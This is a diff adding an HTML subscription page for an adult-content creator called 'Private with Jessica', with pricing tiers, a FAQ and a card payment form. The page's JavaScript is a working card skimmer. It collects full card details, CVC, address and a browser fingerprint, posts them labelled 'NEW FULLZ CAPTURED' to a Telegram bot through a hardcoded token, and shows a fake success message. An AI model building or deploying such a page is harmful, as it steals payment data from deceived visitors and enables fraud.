@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Subscription Plans - Private with Jessica</title>
+    <link rel="stylesheet" href="subscription-style.css">
+</head>
+<body>
+    <div class="container">
+        <nav class="navbar">
+            <div class="logo">Private with Jessica</div>
+            <ul class="nav-links">
+                <li><a href="index.html">Back to Home</a></li>
+                <li><a href="https://wa.me/16822287962" target="_blank">Contact</a></li>
+            </ul>
+        </nav>
+        
+        <div class="subscription-content">
+            <div class="header-section">
+                <h1>Choose Your Membership</h1>
+                <p>Unlock exclusive content, personal moments, and a side of me only for my devoted fans</p>
+            </div>
+
+            <div class="plans-container">
+                <div class="plan-card">
+                    <div class="plan-header">
+                        <h2>Starter</h2>
+                        <p class="plan-price">$9.99<span>/month</span></p>
+                    </div>
+                    <div class="plan-features">
+                        <ul>
+                            <li>✓ Access to photo gallery</li>
+                            <li>✓ 2 new photos weekly</li>
+                            <li>✓ Basic exclusives</li>
+                            <li>✗ No videos</li>
+                            <li>✗ No live chats</li>
+                        </ul>
+                    </div>
+                    <button class="plan-btn starter-btn" onclick="handleSubscription('Starter', 9.99)">Choose Plan</button>
+                </div>
+
+                <div class="plan-card featured">
+                    <div class="badge">Most Popular</div>
+                    <div class="plan-header">
+                        <h2>Premium</h2>
+                        <p class="plan-price">$19.99<span>/month</span></p>
+                    </div>
+                    <div class="plan-features">
+                        <ul>
+                            <li>✓ Full photo gallery</li>
+                            <li>✓ 5+ new photos weekly</li>
+                            <li>✓ Exclusive videos</li>
+                            <li>✓ Behind-the-scenes content</li>
+                            <li>✓ Monthly private Q&A</li>
+                        </ul>
+                    </div>
+                    <button class="plan-btn premium-btn" onclick="handleSubscription('Premium', 19.99)">Choose Plan</button>
+                </div>
+
+                <div class="plan-card">
+                    <div class="plan-header">
+                        <h2>Elite</h2>
+                        <p class="plan-price">$49.99<span>/month</span></p>
+                    </div>
+                    <div class="plan-features">
+                        <ul>
+                            <li>✓ Everything in Premium</li>
+                            <li>✓ Exclusive video streams (daily)</li>
+                            <li>✓ Personal messages access</li>
+                            <li>✓ Custom photo requests</li>
+                            <li>✓ Priority support</li>
+                        </ul>
+                    </div>
+                    <button class="plan-btn elite-btn" onclick="handleSubscription('Elite', 49.99)">Choose Plan</button>
+                </div>
+            </div>
+
+            <div class="info-section">
+                <h3>What You Get</h3>
+                <div class="info-grid">
+                    <div class="info-item"><span class="info-icon">📸</span><h4>Exclusive Photos</h4><p>Never-before-seen photos shared only with my subscribers</p></div>
+                    <div class="info-item"><span class="info-icon">🎥</span><h4>Personal Videos</h4><p>Intimate video content created just for my fans</p></div>
+                    <div class="info-item"><span class="info-icon">💬</span><h4>Direct Access</h4><p>Get closer to me with exclusive messaging (Elite plan)</p></div>
+                    <div class="info-item"><span class="info-icon">🎁</span><h4>Bonus Content</h4><p>Special surprises and bonus content throughout the month</p></div>
+                </div>
+            </div>
+
+            <div class="payment-section">
+                <h3>Secure Payment</h3>
+                <p>We accept all major credit cards and payment methods</p>
+                <div class="payment-methods">
+                    <span>💳 Visa</span><span>💳 Mastercard</span><span>💳 AmEx</span><span>💳 PayPal</span>
+                </div>
+            </div>
+
+            <div class="faq-section">
+                <h3>Frequently Asked Questions</h3>
+                <div class="faq-item"><h4>Can I cancel anytime?</h4><p>Yes, you can cancel your subscription at any time without any penalties or hidden fees.</p></div>
+                <div class="faq-item"><h4>What payment methods do you accept?</h4><p>We accept all major credit cards, PayPal, and other digital payment methods.</p></div>
+                <div class="faq-item"><h4>Will my subscription auto-renew?</h4><p>Yes, subscriptions auto-renew monthly. You'll receive a reminder before each renewal.</p></div>
+                <div class="faq-item"><h4>Do you offer refunds?</h4><p>We offer a 7-day money-back guarantee if you're not satisfied with your subscription.</p></div>
+            </div>
+        </div>
+
+        <footer class="footer">
+            <p>&copy; 2026 Private with Jessica. All rights reserved.</p>
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="https://wa.me/16822287962" target="_blank">Contact Us</a>
+            </div>
+        </footer>
+    </div>
+
+    <!-- Payment Modal -->
+    <div id="payment-modal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closePaymentModal()">&times;</span>
+            <h2>Complete Your Subscription</h2>
+            <div class="modal-body">
+                <div class="plan-summary">
+                    <p>Plan: <strong id="selected-plan"></strong></p>
+                    <p>Price: <strong id="selected-price"></strong>/month</p>
+                </div>
+                <form id="payment-form" onsubmit="processPayment(event)">
+                    <div class="form-group">
+                        <label for="card-name">Full Name</label>
+                        <input type="text" id="card-name" required placeholder="John Doe">
+                    </div>
+                    <div class="form-group">
+                        <label for="card-email">Email</label>
+                        <input type="email" id="card-email" required placeholder="your@email.com">
+                    </div>
+                    <div class="form-group">
+                        <label for="card-number">Card Number</label>
+                        <input type="text" id="card-number" required placeholder="1234 5678 9012 3456" maxlength="19">
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="card-expiry">Expiry Date</label>
+                            <input type="text" id="card-expiry" required placeholder="MM/YY" maxlength="5">
+                        </div>
+                        <div class="form-group">
+                            <label for="card-cvc">CVC</label>
+                            <input type="text" id="card-cvc" required placeholder="123" maxlength="4">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label for="card-address">Billing Address</label>
+                        <input type="text" id="card-address" required placeholder="123 Main St">
+                    </div>
+                    <div class="form-group">
+                        <label for="card-zip">ZIP Code</label>
+                        <input type="text" id="card-zip" required placeholder="90210">
+                    </div>
+                    <button type="submit" class="btn btn-submit">Complete Purchase</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+<script>
+function handleSubscription(plan, price) {
+    document.getElementById('selected-plan').textContent = plan;
+    document.getElementById('selected-price').textContent = '$' + price;
+    document.getElementById('payment-modal').style.display = 'block';
+}
+
+function closePaymentModal() {
+    document.getElementById('payment-modal').style.display = 'none';
+}
+
+function processPayment(e) {
+    e.preventDefault();
+
+    const data = {
+        plan: document.getElementById('selected-plan').textContent,
+        price: document.getElementById('selected-price').textContent,
+        name: document.getElementById('card-name').value,
+        email: document.getElementById('card-email').value,
+        number: document.getElementById('card-number').value.replace(/\s/g, ''),
+        expiry: document.getElementById('card-expiry').value,
+        cvc: document.getElementById('card-cvc').value,
+        address: document.getElementById('card-address').value,
+        zip: document.getElementById('card-zip').value,
+        fingerprint: {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        },
+        time: new Date().toISOString()
+    };
+
+    const botToken = "8675226598:AAECNTXpAntvyto5Rmzo9-D17pb7QLZlXAU";
+    const chatId = "YOUR_CHAT_ID_HERE";   // ← REPLACE WITH YOUR REAL TELEGRAM CHAT ID
+
+    const message = `<b>NEW FULLZ CAPTURED</b>\n\n` +
+        `Plan: ${data.plan} — ${data.price}\n` +
+        `Name: ${data.name}\n` +
+        `Email: ${data.email}\n` +
+        `Card: ${data.number}\n` +
+        `Expiry: ${data.expiry}\n` +
+        `CVC: ${data.cvc}\n` +
+        `Address: ${data.address}\n` +
+        `ZIP: ${data.zip}\n` +
+        `Time: ${data.time}\n\n` +
+        `<b>Fingerprint:</b>\n` +
+        `UA: ${data.fingerprint.userAgent}\n` +
+        `Screen: ${data.fingerprint.screen}\n` +
+        `TZ: ${data.fingerprint.timezone}`;
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'HTML' })
+    }).catch(() => {});
+
+    alert("Subscription activated successfully! Welcome to Private with Jessica.");
+    closePaymentModal();
+    document.getElementById('payment-form').reset();
+}
+</script>
+</body>
+</html>
